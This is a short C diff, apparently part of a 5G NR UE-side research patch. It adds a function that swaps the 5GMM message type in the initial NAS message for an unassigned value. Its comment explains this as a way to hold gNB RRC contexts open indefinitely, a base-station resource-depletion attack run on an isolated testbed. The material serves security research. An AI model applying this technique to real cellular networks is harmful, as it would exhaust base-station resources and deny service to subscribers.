 /** @brief Check if there is dedicated NAS information to forward to NAS */
+/* A-NAS (rss-landscape.md 3.2, LTEFuzz "BTS resource depletion").
+   The gNB's RRC setup guard is cancelled the moment Msg5 arrives, so a
+   completed context has no expiry and its lifetime is decided by the core.
+   We then make sure the core never finishes anything: the 5GMM message type is
+   replaced with an unassigned value, so the AMF cannot act on the payload,
+   never resolves a SUPI (the held contexts therefore cannot collapse onto one
+   subscriber) and has no NAS procedure to accept or reject.
+   Plain 5GMM header: [EPD 0x7E][security header type][message type].
+   Isolated testbed only -- UE side only, the gNB is untouched. */
+static void nr_rss_blind_initial_nas(int ue, uint8_t *nas_data, uint32_t length)
+{
+  if (!nr_rss_is_anas(ue) || nas_data == NULL || length < 3 || nas_data[0] != 0x7e)
+    return;
+  nas_data[2] = 0xf0;
+  LOG_I(NR_RRC, "[RSS] A-NAS UE %d: initial NAS blinded (%u B)\n", ue, length);
+}
